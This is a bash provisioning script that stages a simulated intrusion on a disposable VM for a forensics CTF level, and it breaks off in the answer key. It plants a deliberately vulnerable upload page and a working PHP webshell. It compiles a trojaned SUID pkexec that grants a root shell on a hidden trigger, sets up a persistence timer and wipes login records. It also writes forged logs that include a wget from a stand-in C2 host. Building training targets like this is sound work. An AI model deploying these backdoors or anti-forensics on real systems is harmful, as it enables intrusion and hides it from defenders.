#!/usr/bin/env bash
# WARNING: this builder installs a live backdoor and forces a core dump on the
# machine it runs on. Run it ONLY as root on a disposable, throwaway VM, never
# on a working machine. It is the L400 disk-image builder.
#
# ============================================================================
#  WATCHLIST CTF - L400 "Mission Creep"  ::  disk-image provisioner
#  Runs ON the victim VM (fresh Ubuntu Server 22.04 minimal) as root.
#  Performs a real, coherent 5-stage intrusion, then you zero-fill + image it.
#
#  Blue-team forensics target: the player investigates, never exploits.
#  Single end flag (S5). Stages 1-4 yield in-world pivots, NOT flags.
#
#  USAGE:   sudo MODE=build bash build_l400.sh
#           sudo MODE=verify bash build_l400.sh     # self-solve sanity (post-build)
#           sudo MODE=answerkey bash build_l400.sh   # print the answer key only
#
#  IMPORTANT: run ONCE on a fresh VM. Snapshot the VM before running so a
#  re-build is a revert + re-run (an attack chain is not cleanly idempotent).
# ============================================================================
set -euo pipefail

# never let apt/needrestart pop an interactive prompt (Ubuntu 22.04 hangs scripts otherwise)
export DEBIAN_FRONTEND=noninteractive
export NEEDRESTART_MODE=a
export NEEDRESTART_SUSPEND=1

# ----------------------------------------------------------------------------
# CONFIG (locked for this event; edit here only)
# ----------------------------------------------------------------------------
L400_HOSTNAME="relay-07"
L400_USER="jhayes"                       # legit admin whose box got owned (UID 1000+)
L400_OS_ID="ubuntu"
L400_OS_VER="22.04"
TROJAN_TARGET="/usr/bin/pkexec"          # dpkg-owned -> dpkg --verify/debsums flags it

# the one submittable flag (recovered from the S5 core dump)
FLAG='number{a_foothold_is_never_just_a_foothold}'

# in-world pivots (deliberately NOT flag-formatted, so nothing competes with FLAG)
PIVOT_S1="/dev/shm/.k"                    # second-stage drop the webshell fetched
SECOND_STAGE_TAG="relay-stage2"          # marker inside the second stage
PERSIST_UNIT="cleanup"                   # cleanup.timer + cleanup.service
PERSIST_SCRIPT="/usr/local/sbin/.sysupd" # payload the unit runs
BACKDOOR_MAGIC="C0NT1NGENCY"             # pkexec backdoor trigger (needs light RE to find)
EXFIL_DIR="/var/tmp/.x"                  # staged archive + surviving core dump

# intrusion timeline (UTC). Noise lives OUTSIDE this window so triage separates it.
INSTALL_DATE="2026-03-02"                # box provisioned (lived-in baseline)
NOISE_DATE="2026-04-09"                  # opportunistic internet scan/brute (days earlier)
INTRUSION_DATE="2026-04-14"             # the real attack
T_S1="2026-04-14 02:15:51"              # initial access (upload)
T_S1B="2026-04-14 02:16:40"            # second-stage wget into /dev/shm
T_S2="2026-04-14 02:19:08"             # persistence installed
T_S3="2026-04-14 02:23:30"             # pkexec trojaned (privesc)
T_S5="2026-04-14 02:31:12"             # exfil staged + core dump
T_S4="2026-04-14 02:38:05"             # cover-up LAST (history/wtmp wiped on the way out)

ATTACKER_IP="203.0.113.7"
C2_IP="198.51.100.9"

# ----------------------------------------------------------------------------
# pretty logging (L100 house style)
# ----------------------------------------------------------------------------
c_reset=$'\033[0m'; c_bold=$'\033[1m'; c_grn=$'\033[32m'; c_red=$'\033[31m'
c_yel=$'\033[33m'; c_cyn=$'\033[36m'; c_dim=$'\033[2m'
PHASE=0
phase(){ PHASE=$((PHASE+1)); printf '\n%s%s━━ PHASE %d ━ %s %s\n' "$c_bold" "$c_cyn" "$PHASE" "$1" "$c_reset"; }
ok(){    printf '   %s✓%s %s\n' "$c_grn" "$c_reset" "$1"; }
info(){  printf '   %s•%s %s\n' "$c_dim" "$c_reset" "$1"; }
warn(){  printf '   %s!%s %s\n' "$c_yel" "$c_reset" "$1"; }
die(){   printf '\n%s✗ FATAL:%s %s\n' "$c_red" "$c_reset" "$1" >&2; exit 1; }

# ----------------------------------------------------------------------------
# PREFLIGHT  (mirrors the L100 pattern: fail loud + early, never half-build)
# ----------------------------------------------------------------------------
preflight(){
  phase "PREFLIGHT - refuse to run on the wrong box"

  # 1) root
  [ "$(id -u)" -eq 0 ] || die "must run as root (sudo)."
  ok "running as root"

  # 2) OS gate - Ubuntu 22.04 exactly (artifacts/paths/hashes are pinned to it)
  [ -r /etc/os-release ] || die "/etc/os-release missing; cannot confirm OS."
  . /etc/os-release
  [ "${ID:-}" = "$L400_OS_ID" ] || die "expected $L400_OS_ID, found '${ID:-?}'. Aborting."
  case "${VERSION_ID:-}" in
    "$L400_OS_VER") ok "OS is $PRETTY_NAME" ;;
    *) die "expected Ubuntu $L400_OS_VER, found '${VERSION_ID:-?}'. Build is pinned to 22.04." ;;
  esac

  # 3) fresh-box guard - don't double-run an attack chain
  if [ -f /var/lib/.l400_built ]; then
    die "this box was already provisioned (marker /var/lib/.l400_built). Revert the snapshot and re-run."
  fi
  ok "fresh box (no prior build marker)"

  # 4) username must NOT be a RESERVED/system account (uid<1000). A prior-build
  #    jhayes (uid>=1000) is fine - p2_user recreates it cleanly.
  if id "$L400_USER" >/dev/null 2>&1; then
    local _uid; _uid=$(id -u "$L400_USER")
    [ "$_uid" -lt 1000 ] && die "user '$L400_USER' is a reserved system account (uid $_uid). Pick another in CONFIG."
    warn "user '$L400_USER' exists from a prior run (uid $_uid) - will be recreated cleanly"
  else
    ok "username '$L400_USER' is free (not reserved)"
  fi

  # 5) trojan target must exist and be dpkg-owned (so verification can flag it later)
  [ -f "$TROJAN_TARGET" ] || die "trojan target $TROJAN_TARGET not present; install policykit-1 first."
  if ! dpkg -S "$TROJAN_TARGET" >/dev/null 2>&1; then
    die "$TROJAN_TARGET is not dpkg-owned; detection (dpkg --verify) would not flag it."
  fi
  ok "trojan target $TROJAN_TARGET exists and is dpkg-owned ($(dpkg -S "$TROJAN_TARGET" | cut -d: -f1))"

  # 6) build tools present (install if missing)
  local need=(gcc tar xz-utils debsums) miss=()
  for p in "${need[@]}"; do dpkg -s "$p" >/dev/null 2>&1 || miss+=("$p"); done
  if [ "${#miss[@]}" -gt 0 ]; then
    info "installing build deps: ${miss[*]}"
    DEBIAN_FRONTEND=noninteractive apt-get update -qq
    DEBIAN_FRONTEND=noninteractive apt-get install -y -qq "${miss[@]}" || die "dep install failed."
  fi
  ok "build tools present (gcc, tar, xz, debsums)"

  # 7) confirm coreutils for timeline stamping
  command -v touch >/dev/null && command -v date >/dev/null || die "coreutils missing."
  ok "timeline tools ready"

  printf '\n   %sPreflight OK - target %s / user %s / Ubuntu %s%s\n' \
    "$c_dim" "$L400_HOSTNAME" "$L400_USER" "$L400_OS_VER" "$c_reset"
}

# ----------------------------------------------------------------------------
# PHASE 2 - BASELINE: a lived-in relay node (the box BEFORE the attack)
# All timestamping is centralised in the coherence phase (added later), so
# baseline files are created now and restamped to INSTALL_DATE at the end.
# ----------------------------------------------------------------------------
p2_hostname(){
  phase "BASELINE - node identity"
  hostnamectl set-hostname "$L400_HOSTNAME" 2>/dev/null || echo "$L400_HOSTNAME" > /etc/hostname
  grep -q "$L400_HOSTNAME" /etc/hosts || sed -i "1i 127.0.1.1\t$L400_HOSTNAME" /etc/hosts
  ok "hostname set to $L400_HOSTNAME"
}

p2_user(){
  phase "BASELINE - admin user $L400_USER"
  # clean slate: remove any leftover user/group from a partial prior run
  userdel -rf "$L400_USER" 2>/dev/null || true
  getent group "$L400_USER" >/dev/null 2>&1 && groupdel "$L400_USER" 2>/dev/null || true
  adduser --disabled-password --gecos "Jordan Hayes,,," "$L400_USER" >/dev/null
  echo "$L400_USER:$(openssl rand -base64 12 2>/dev/null || echo Chx7s9q2Lp0w)" | chpasswd
  usermod -aG sudo "$L400_USER"
  ok "created $L400_USER (uid $(id -u "$L400_USER")), sudo group, real home"
}

p2_web_stack(){
  phase "BASELINE - web stack (the exposed surface)"
  apt-get install -y nginx php-fpm apt-utils
  install -d -o www-data -g www-data /var/www/html/uploads
  cat > /var/www/html/index.php <<'PHP'
<?php // relay-07 node status
echo "<h1>relay-07</h1><p>node status: <b>online</b></p>";
echo "<p>upload diagnostics: <a href='/upload.php'>here</a></p>";
PHP
  # THE VULNERABILITY: unrestricted upload, no type/extension validation
  cat > /var/www/html/upload.php <<'PHP'
<?php
// diagnostics upload - TODO: add validation before prod (never done)
if ($_SERVER['REQUEST_METHOD']==='POST' && isset($_FILES['f'])) {
  $dest = "/var/www/html/uploads/".basename($_FILES['f']['name']);
  move_uploaded_file($_FILES['f']['tmp_name'], $dest);
  echo "stored: ".$dest;
} else {
  echo '<form method=post enctype=multipart/form-data><input type=file name=f><input type=submit></form>';
}
PHP
  chown -R www-data:www-data /var/www/html
  local sock; sock=$(ls /run/php/php*-fpm.sock 2>/dev/null | head -1)
  [ -n "$sock" ] || warn "php-fpm socket not found yet (will resolve after php-fpm start)"
  cat > /etc/nginx/sites-available/default <<NGINX
server {
  listen 80 default_server;
  root /var/www/html;
  index index.php index.html;
  location / { try_files \$uri \$uri/ =404; }
  location ~ \.php\$ { include snippets/fastcgi-php.conf; fastcgi_pass unix:${sock:-/run/php/php-fpm.sock}; }
}
NGINX
  systemctl enable --now nginx 'php*-fpm' >/dev/null 2>&1 || true
  ok "nginx + php-fpm serving /var/www/html (vulnerable upload.php live)"
}

p2_baseline(){
  phase "BASELINE - lived-in history + legit traffic"
  : > /var/log/nginx/access.log   # idempotent: start clean so re-runs don't double-seed
  local h="/home/$L400_USER/.bash_history"
  cat > "$h" <<'HIST'
sudo apt update
sudo apt upgrade -y
sudo systemctl status nginx
df -h
free -m
sudo vim /etc/nginx/sites-available/default
sudo systemctl reload nginx
journalctl -u nginx --since today
top
HIST
  chown "$L400_USER:$L400_USER" "$h"; chmod 600 "$h"
  local acc=/var/log/nginx/access.log
  cat >> "$acc" <<LOG
192.0.2.20 - - [05/Mar/2026:09:12:44 +0000] "GET / HTTP/1.1" 200 86 "-" "Mozilla/5.0 (X11; Linux x86_64)"
192.0.2.55 - - [11/Mar/2026:14:03:18 +0000] "GET / HTTP/1.1" 200 86 "-" "Mozilla/5.0 (Windows NT 10.0)"
198.51.100.4 - - [22/Mar/2026:08:41:02 +0000] "GET /favicon.ico HTTP/1.1" 404 153 "-" "Mozilla/5.0"
LOG
  ok "seeded $L400_USER history + legit web traffic (pre-attack)"
}

p2_legit_persistence(){
  phase "BASELINE - legitimate timers (cover for the malicious one)"
  cat > /etc/systemd/system/nodebackup.service <<'UNIT'
[Unit]
Description=Nightly relay config backup
[Service]
Type=oneshot
ExecStart=/usr/local/sbin/nodebackup
UNIT
  cat > /etc/systemd/system/nodebackup.timer <<'UNIT'
[Unit]
Description=Run relay config backup nightly
[Timer]
OnCalendar=*-*-* 03:30:00
Persistent=true
[Install]
WantedBy=timers.target
UNIT
  cat > /usr/local/sbin/nodebackup <<'SH'
#!/bin/sh
# benign: archive the nginx config nightly
tar czf /var/backups/relay-conf.tgz /etc/nginx 2>/dev/null
SH
  chmod 755 /usr/local/sbin/nodebackup
  systemctl enable nodebackup.timer >/dev/null 2>&1 || true
  ok "installed legit nodebackup.timer (stock logrotate/apt timers remain too)"
}

# ----------------------------------------------------------------------------
# PHASE 3 - NOISE: internet background radiation (the triage layer)
# Stamped on NOISE_DATE, OUTSIDE the intrusion window, so a timeline cleanly
# separates it from the real attack. The skill is telling signal from noise.
# ----------------------------------------------------------------------------
p3_scan_flood(){
  phase "NOISE - opportunistic web scan (nginx access log)"
  local acc=/var/log/nginx/access.log
  # a generic scanner hammering common paths; ALL fail (404/403) - none succeed.
  # The real attack's ONE successful POST /upload.php must be found among these.
  local scanip="45.146.0.0" ; local d="09/Apr/2026"
  local paths=(/ /admin /administrator /wp-login.php /wp-admin/ /.env /.git/config
               /phpmyadmin/ /xmlrpc.php /vendor/phpunit /shell.php /cgi-bin/test.cgi
               /.aws/credentials /config.json /backup.zip /server-status /actuator/health
               /solr/ /api/v1/ /owa/ /manager/html /.svn/entries /info.php /test.php)
  local ua="Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
  local sec=10 line code
  : > /tmp/.scan.$$
  for p in "${paths[@]}"; do
    case "$p" in /) code=200; sz=86;; /server-status|/manager/html) code=403; sz=153;; *) code=404; sz=153;; esac
    printf '%s - - [%s:03:%02d:%02d +0000] "GET %s HTTP/1.1" %s %s "-" "%s"\n' \
      "$scanip" "$d" $((sec/60)) $((sec%60)) "$p" "$code" "$sz" "$ua" >> /tmp/.scan.$$
    sec=$((sec+3))
  done
  cat /tmp/.scan.$$ >> "$acc"; local n=$(wc -l < /tmp/.scan.$$); rm -f /tmp/.scan.$$
  ok "injected $n scanner probes (all 404/403) on $NOISE_DATE - signal will hide among these"
}

p3_ssh_brute(){
  phase "NOISE - SSH brute-force burst (auth.log)"
  local auth=/var/log/auth.log
  : > "$auth"   # idempotent + drops build-time sudo lines (coherence)
  # failed root/common-user logins from random IPs. The REAL access came via the
  # web app, not SSH - so this whole stream is a dead end a careful reader rules out.
  local d="Apr  9" users=(root admin test ubuntu oracle postgres git user pi) ips=(193.27.228.5 61.177.172.13 218.92.0.34 141.98.10.7)
  : > /tmp/.brute.$$
  local mm=11 ss=2 i=0
  for u in "${users[@]}" "${users[@]}"; do
    local ip="${ips[$((i % ${#ips[@]}))]}"
    printf '%s %02d:%02d:%02d %s sshd[%d]: Failed password for %s%s from %s port %d ssh2\n' \
      "$d" 2 "$mm" "$ss" "$L400_HOSTNAME" $((2000+i)) \
      "$([ "$u" = root ] && echo "" || echo "invalid user ")" "$u" "$ip" $((40000+i)) >> /tmp/.brute.$$
    ss=$((ss+7)); [ "$ss" -ge 60 ] && { ss=$((ss-60)); mm=$((mm+1)); }; i=$((i+1))
  done
  cat /tmp/.brute.$$ >> "$auth" 2>/dev/null || { mkdir -p /var/log; cat /tmp/.brute.$$ >> "$auth"; }
  local n=$(wc -l < /tmp/.brute.$$); rm -f /tmp/.brute.$$
  ok "injected $n failed-SSH attempts on $NOISE_DATE (dead-end: real access was web, not ssh)"
}

# ----------------------------------------------------------------------------
# PHASE 4 - STAGE 1: INITIAL ACCESS (webshell upload via the vulnerable app)
# Recoverable artifacts: the webshell file on disk + the ONE successful upload
# and command trail in access.log (standing out from the Phase-3 scan noise).
# The 2nd stage lands in /dev/shm (tmpfs) => GONE after power-off, by design.
# ----------------------------------------------------------------------------
p4_initial_access(){
  phase "STAGE 1 - initial access (webshell)"
  local sh=/var/www/html/uploads/sess_4f1c.php
  cat > "$sh" <<'PHP'
<?php // sess handler
if (isset($_GET['c'])) { system($_GET['c']); }
PHP
  chown www-data:www-data "$sh"; chmod 644 "$sh"
  touch -d "$T_S1" "$sh"
  ok "planted webshell $sh (on disk, recoverable)"

  local acc=/var/log/nginx/access.log
  local ua="curl/7.81.0"
  {
    printf '%s - - [14/Apr/2026:02:15:51 +0000] "POST /upload.php HTTP/1.1" 200 31 "-" "%s"\n' "$ATTACKER_IP" "$ua"
    printf '%s - - [14/Apr/2026:02:16:03 +0000] "GET /uploads/sess_4f1c.php?c=id HTTP/1.1" 200 54 "-" "%s"\n' "$ATTACKER_IP" "$ua"
    printf '%s - - [14/Apr/2026:02:16:15 +0000] "GET /uploads/sess_4f1c.php?c=uname+-a HTTP/1.1" 200 96 "-" "%s"\n' "$ATTACKER_IP" "$ua"
    printf '%s - - [14/Apr/2026:02:16:40 +0000] "GET /uploads/sess_4f1c.php?c=wget+http://%s/k+-O+%s HTTP/1.1" 200 12 "-" "%s"\n' "$ATTACKER_IP" "$C2_IP" "$PIVOT_S1" "$ua"
    printf '%s - - [14/Apr/2026:02:16:48 +0000] "GET /uploads/sess_4f1c.php?c=chmod+%%2Bx+%s HTTP/1.1" 200 0 "-" "%s"\n' "$ATTACKER_IP" "$PIVOT_S1" "$ua"
    printf '%s - - [14/Apr/2026:02:16:55 +0000] "GET /uploads/sess_4f1c.php?c=%s HTTP/1.1" 200 0 "-" "%s"\n' "$ATTACKER_IP" "$PIVOT_S1" "$ua"
  } >> "$acc"
  ok "logged 1 successful upload + 5 webshell commands (signal vs the 404 scan noise)"

  if [ -d /dev/shm ]; then
    cat > "$PIVOT_S1" <<'SH'
#!/bin/sh
# second stage (relay-stage2): drops persistence, then evaporates on reboot
SH
    chmod +x "$PIVOT_S1" 2>/dev/null || true
    info "wrote volatile 2nd stage $PIVOT_S1 (tmpfs - expected to vanish on power-off)"
  fi
  warn "S1 pivot = persistence was established; investigator hunts it on disk next (S2)"
}

# ----------------------------------------------------------------------------
# PHASE 5 - STAGE 2: PERSISTENCE (malicious systemd timer + hidden payload)
# Found by persistence-hunting. Must stand out from the LEGIT nodebackup.timer:
#   tells = hidden dot-script, every-15-min schedule, intrusion-window mtime,
#   generic "cleanup" name. Payload points at pkexec => the S3 pivot.
# ----------------------------------------------------------------------------
p5_persistence(){
  phase "STAGE 2 - persistence (cleanup.timer)"
  # the hidden payload (dot-prefixed in /usr/local/sbin so `ls` hides it)
  cat > "$PERSIST_SCRIPT" <<'SH'
#!/bin/sh
# maintenance helper
# contingency: keep the escalation path warm even after patches
PK=/usr/bin/pkexec
[ -u "$PK" ] || chmod u+s "$PK"     # ensure the privesc stays SUID-root
logger -t cleanup "node maintenance ok" 2>/dev/null || true
SH
  chmod 700 "$PERSIST_SCRIPT"

  cat > /etc/systemd/system/${PERSIST_UNIT}.service <<UNIT
[Unit]
Description=System cleanup

[Service]
Type=oneshot
ExecStart=${PERSIST_SCRIPT}
UNIT

  cat > /etc/systemd/system/${PERSIST_UNIT}.timer <<'UNIT'
[Unit]
Description=Periodic system cleanup

[Timer]
OnCalendar=*-*-* *:0/15:00
Persistent=true

[Install]
WantedBy=timers.target
UNIT

  systemctl enable ${PERSIST_UNIT}.timer >/dev/null 2>&1 || true

  # stamp all three into the intrusion window (stands out from install-date baseline)
  touch -d "$T_S2" "$PERSIST_SCRIPT" \
        /etc/systemd/system/${PERSIST_UNIT}.service \
        /etc/systemd/system/${PERSIST_UNIT}.timer
  ok "installed ${PERSIST_UNIT}.timer + ${PERSIST_UNIT}.service + ${PERSIST_SCRIPT} (hidden, 15-min, $T_S2)"
  warn "S2 pivot = ${PERSIST_SCRIPT} references pkexec -> examine the binary next (S3)"
}

# ----------------------------------------------------------------------------
# PHASE 6 - STAGE 3: PRIVILEGE ESCALATION (trojaned pkexec)
# Swaps the dpkg-owned pkexec for a backdoored build => dpkg --verify/debsums
# flag the hash mismatch. The trigger is XOR-obfuscated (light RE, not a string).
# Original hash recorded for the answer key; build artifacts cleaned off-image.
# ----------------------------------------------------------------------------
ORIG_PKEXEC_SHA=""   # captured at build, surfaced in the answer key (never on image)

p6_privesc(){
  phase "STAGE 3 - privilege escalation (trojaned pkexec)"
  local target="$TROJAN_TARGET"
  [ -f "$target" ] || die "pkexec missing; install policykit-1 in preflight."

  # 1) record the ORIGINAL hash (for the answer key only; not left on the image)
  # 0) resolve the owning package dynamically (it is NOT always policykit-1)
  local pkg; pkg=$(dpkg -S "$target" 2>/dev/null | head -1 | cut -d: -f1)
  [ -n "$pkg" ] || die "could not resolve the package owning $target."
  info "pkexec is owned by package: $pkg"
  # restore a pristine pkexec first, so a RE-RUN records the real original hash
  info "ensuring pristine $target (reinstall $pkg)…"
  apt-get install --reinstall -y "$pkg" >/dev/null 2>&1 || warn "reinstall failed (network?); original hash may be stale on a re-run"

  # 1) record the ORIGINAL hash (answer key only)
  ORIG_PKEXEC_SHA=$(sha256sum "$target" | awk '{print $1}')
  info "original pkexec sha256 recorded for answer key: ${ORIG_PKEXEC_SHA:0:16}..."

  # 2) generate the trojan source with the trigger XOR'd (0x42) so strings hides it
  local bdir; bdir=$(mktemp -d)
  local arr="" i c x
  for ((i=0; i<${#BACKDOOR_MAGIC}; i++)); do
    c=$(printf '%d' "'${BACKDOOR_MAGIC:$i:1}")
    x=$(( c ^ 0x42 ))
    arr+="0x$(printf '%02x' "$x"),"
  done
  cat > "$bdir/pk.c" <<C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
/* PolicyKit local authority - pkexec */
static unsigned char k[] = {${arr%,}};
static int authok(const char *s){
  size_t n = sizeof(k); unsigned char b[64];
  if (strlen(s) != n) return 0;
  for (size_t i=0;i<n;i++) b[i] = k[i] ^ 0x42;
  return memcmp(b, s, n) == 0;
}
int main(int argc, char **argv){
  char *t = getenv("PKEXEC_AUTH");
  if (t && authok(t)) { if(setuid(0)||setgid(0)){} execl("/bin/bash","bash",(char*)0); }
  fprintf(stderr, "pkexec must be setuid root\n");
  return 127;
}
C
  # 3) compile (keep symbols => "light" RE) and swap in as SUID root
  gcc -O2 -o "$bdir/pkexec" "$bdir/pk.c" || die "trojan compile failed."
  install -m4755 -o root -g root "$bdir/pkexec" "$target"
  touch -d "$T_S3" "$target"
  rm -rf "$bdir"   # no build artifacts on the image
  ok "swapped in trojaned pkexec (SUID root, mtime $T_S3); original hash recorded"

  # 4) self-check detection deterministically: compare current md5 to the package record
  local rec cur md5f
  md5f=$(ls /var/lib/dpkg/info/${pkg}*.md5sums 2>/dev/null | head -1)
  rec=$(grep -E '(^| )usr/bin/pkexec$' "$md5f" 2>/dev/null | awk '{print $1}' | head -1)
  cur=$(md5sum "$target" | awk '{print $1}')
  if [ -n "$rec" ] && [ "$rec" != "$cur" ]; then
    ok "pkexec md5 differs from $pkg's record -> dpkg --verify $pkg / debsums $pkg will flag it"
  elif [ -z "$rec" ]; then
    warn "no md5sums entry for pkexec in $pkg - players can't use dpkg --verify; check the package"
  else
    warn "pkexec md5 matches the record (trojan not in place?) - investigate"
  fi
  warn "S3 pivot = backdoored pkexec confirms root; next: what root did = the cover-up (S4)"
}

# ----------------------------------------------------------------------------
# PHASE 7 - STAGE 4: COVER-UP (the wipe is the evidence)
# Zero wtmp/lastlog + clear root history, stamped LAST (on the way out). A
# 0-byte wtmp on a weeks-old box with a full auth.log is the anomaly. The
# jhayes baseline history is left intact as the honest contrast.
# ----------------------------------------------------------------------------
p7_coverup(){
  phase "STAGE 4 - cover-up (wtmp/lastlog wiped, history cleared)"

  # 1) wipe the login records (classic anti-forensics; the 0-byte file IS the tell)
  : > /var/log/wtmp
  : > /var/log/lastlog
  ok "zeroed /var/log/wtmp and /var/log/lastlog (now 0 bytes)"

  # 2) clear root's history (the attacker's post-privesc session). jhayes stays.
  : > /root/.bash_history
  rm -f /var/www/.bash_history /home/www-data/.bash_history 2>/dev/null || true
  ok "cleared /root/.bash_history (jhayes history left intact = contrast)"

  # 3) date the wipe to the very end of the intrusion window
  touch -d "$T_S4" /var/log/wtmp /var/log/lastlog /root/.bash_history 2>/dev/null || true
  info "wipe stamped $T_S4 (last action before they left)"

  # 4) sanity: the box must still LOOK alive elsewhere, or the wipe isn't anomalous
  if [ -s /var/log/auth.log ] || [ -s /var/log/nginx/access.log ]; then
    ok "auth.log/access.log retain activity -> the empty wtmp reads as a wipe, not a fresh box"
  else
    warn "no surviving activity logs - wtmp wipe may look like a fresh box; check Phase 2/3 ran"
  fi
  warn "S4 pivot = the wipe proves root-level cleanup; the super-timeline surfaces /var/tmp/.x (S5)"
}

# ----------------------------------------------------------------------------
# PHASE 8 - STAGE 5: EXFIL + THE FLAG (staged archive + surviving core dump)
# The flag lives ONLY in the binary core dump (no plaintext copy anywhere), so
# text-grep fails and the player must do core-dump archaeology. The loot.tgz is
# the "what they took" context (threads Reyes' targets from F200/F300).
# ----------------------------------------------------------------------------
p8_exfil(){
  phase "STAGE 5 - exfil + flag (core dump in $EXFIL_DIR)"
  rm -rf "$EXFIL_DIR"            # idempotent: clear any stale cores/loot from a prior run
  install -d -m700 "$EXFIL_DIR"

  # 1) the staged loot (context - NOT the flag)
  local loot; loot=$(mktemp -d)
  mkdir -p "$loot/relay-config"
  cp /etc/nginx/nginx.conf "$loot/relay-config/" 2>/dev/null || true
  printf 'asset dossier (staged for exfil)\ntargets: chen, voss, tanaka\nhandler: northern lights\n' > "$loot/targets.txt"
  tar czf "$EXFIL_DIR/loot.tgz" -C "$loot" . 2>/dev/null || true
  rm -rf "$loot"
  ok "staged $EXFIL_DIR/loot.tgz (exfiltrated data; context only, no flag)"

  # 2) the surviving core dump: the exfil tool crashed with the C2 auth phrase
  #    (= the FLAG) live in memory. Recoverable via strings/gdb.
  local bdir; bdir=$(mktemp -d)
  cat > "$bdir/exfil.c" <<C
#include <stdio.h>
#include <string.h>
static volatile char secret[] = "relay exfil channel auth = ${FLAG}";
int main(void){
  /* dump EVERYTHING (incl. file-backed pages) so the secret is always captured */
  FILE *f = fopen("/proc/self/coredump_filter","w");
  if (f) { fputs("0xff\n", f); fclose(f); }
  secret[0] = secret[0];   /* dirty the page -> anonymous -> always in the core */
  fprintf(stderr,"staging %zu bytes\n", strlen((char*)secret));
  int *c = 0; *c = 1;       /* crash -> core dump */
  return 0;
}
C
  gcc -O0 -o "$bdir/exfil" "$bdir/exfil.c" || die "exfil stager compile failed."
  # force plain core dumps into the staging dir (runtime sysctl; resets on reboot)
  local oldpat; oldpat=$(cat /proc/sys/kernel/core_pattern 2>/dev/null || echo core)
  echo "$EXFIL_DIR/core.%e.%p" > /proc/sys/kernel/core_pattern 2>/dev/null || warn "could not set core_pattern"
  ( cd "$bdir" && ulimit -c unlimited && ./exfil ) 2>/dev/null || true
  echo "$oldpat" > /proc/sys/kernel/core_pattern 2>/dev/null || true
  rm -rf "$bdir"

  local core; core=$(ls "$EXFIL_DIR"/core.* 2>/dev/null | head -1)
  [ -n "$core" ] || die "core dump not produced (check core_pattern/ulimit on this box)."
  touch -d "$T_S5" "$core" "$EXFIL_DIR/loot.tgz" "$EXFIL_DIR"
  ok "core dump survived: $core"

  # 3) anti-shortcut self-checks  (grep the core DIRECTLY - a strings|grep -q
  #    pipeline trips SIGPIPE under 'set -o pipefail' and falsely reports missing)
  if grep -aqF "$FLAG" "$core"; then
    ok "flag IS recoverable from the core (intended path: strings $core | grep number{)"
  else
    die "flag NOT in the core - the secret was excluded; check coredump_filter/-O0."
  fi
  if grep -rIl 'number{' "$EXFIL_DIR" 2>/dev/null | grep -q .; then
    die "a TEXT file in $EXFIL_DIR contains the flag - must be binary-only."
  else
    ok "no plaintext flag in $EXFIL_DIR (grep -rI finds nothing; only the binary core holds it)"
  fi
  warn "S5 FLAG: strings $core | grep number{   ->  $FLAG"
}

# ----------------------------------------------------------------------------
# PHASE 9 - COHERENCE: one consistent timeline + sanitised build traces
# ----------------------------------------------------------------------------
p9_coherence(){
  phase "COHERENCE - make the whole image tell ONE story"

  # 1) baseline tree -> INSTALL_DATE (the box existed for weeks before the attack)
  local base=("/home/$L400_USER" /var/www/html/index.php /var/www/html/upload.php
              /etc/systemd/system/nodebackup.service /etc/systemd/system/nodebackup.timer
              /usr/local/sbin/nodebackup)
  for p in "${base[@]}"; do [ -e "$p" ] && touch -d "$INSTALL_DATE 10:00:00" "$p" 2>/dev/null || true; done
  find "/home/$L400_USER" -exec touch -d "$INSTALL_DATE 10:00:00" {} + 2>/dev/null || true
  ok "baseline restamped to $INSTALL_DATE"

  # 2) re-assert the intrusion-window mtimes (defensive; each phase set its own)
  touch -d "$T_S1" /var/www/html/uploads/sess_4f1c.php 2>/dev/null || true
  touch -d "$T_S2" "$PERSIST_SCRIPT" /etc/systemd/system/${PERSIST_UNIT}.service /etc/systemd/system/${PERSIST_UNIT}.timer 2>/dev/null || true
  touch -d "$T_S3" "$TROJAN_TARGET" 2>/dev/null || true
  touch -d "$T_S4" /var/log/wtmp /var/log/lastlog /root/.bash_history 2>/dev/null || true
  touch -d "$T_S5" "$EXFIL_DIR" "$EXFIL_DIR"/loot.tgz "$EXFIL_DIR"/core.* 2>/dev/null || true
  ok "intrusion artifacts re-stamped to the Apr-14 window"

  # 3) sanitise package-manager logs so they don't betray the real build date
  #    (otherwise a timeline shows nginx/php installed AFTER the 'attack')
  local logs=(/var/log/dpkg.log /var/log/apt/history.log /var/log/apt/term.log /var/log/alternatives.log)
  for f in "${logs[@]}"; do
    [ -f "$f" ] || continue
    sed -i "s/${BUILD_DATE}/${INSTALL_DATE}/g" "$f" 2>/dev/null || true
    touch -d "$INSTALL_DATE 10:05:00" "$f" 2>/dev/null || true
  done
  ok "package-manager logs rewritten to $INSTALL_DATE (install predates the intrusion)"

  # 4) log file mtimes match their last entries
  touch -d "2026-04-14 02:38:55" /var/log/nginx/access.log 2>/dev/null || true
  [ -f /var/log/nginx/error.log ] && touch -d "$INSTALL_DATE 10:00:00" /var/log/nginx/error.log 2>/dev/null || true
  touch -d "2026-04-14 02:38:05" /var/log/auth.log 2>/dev/null || true

  # 5) tidy build residue (caches; root history already cleared in S4)
  apt-get clean >/dev/null 2>&1 || true
  rm -f /root/.wget-hsts /root/.lesshst 2>/dev/null || true

  # 6) idempotency marker (REMOVED by imageprep before imaging)
  date -u +%FT%TZ > /var/lib/.l400_built
  ok "coherence pass complete (marker set; imageprep will remove it)"
}

# ----------------------------------------------------------------------------
# ANSWER KEY (written off-image to /root; imageprep deletes it)
# ----------------------------------------------------------------------------
write_answerkey(){
  local f=/root/L400_ANSWERKEY.txt
  local PKG; PKG=$(dpkg -S "$TROJAN_TARGET" 2>/dev/null | head -1 | cut -d: -f1)
  cat > "$f" <<KEY
==================== L400 "MISSION CREEP" - ANSWER KEY ====================
host: $L400_HOSTNAME   admin user: $L400_USER   OS: Ubuntu $L400_OS_VER
intrusion window: $INTRUSION_DATE 02:15-02:38 UTC   noise: $NOISE_DATE
FLAG: $FLAG

S0 ORIENTATION
  mount image read-only; super-timeline (plaso / fls+mactime). One window
  (Apr 14 02:15-02:38) lights up = the intrusion. Apr 9 = scan/brute NOISE.

S1 INITIAL ACCESS  (pivot: /dev/shm second stage -- volatile, in the log)
  /var/log/nginx/access.log: the ONE 'POST /upload.php 200' from $ATTACKER_IP
  among the 404 scan flood -> webshell /var/www/html/uploads/sess_4f1c.php
  -> ?c= commands incl. wget into $PIVOT_S1 (tmpfs; gone after power-off).

S2 PERSISTENCE  (pivot: payload references pkexec)
  ${PERSIST_UNIT}.timer (every 15 min) + ${PERSIST_UNIT}.service ->
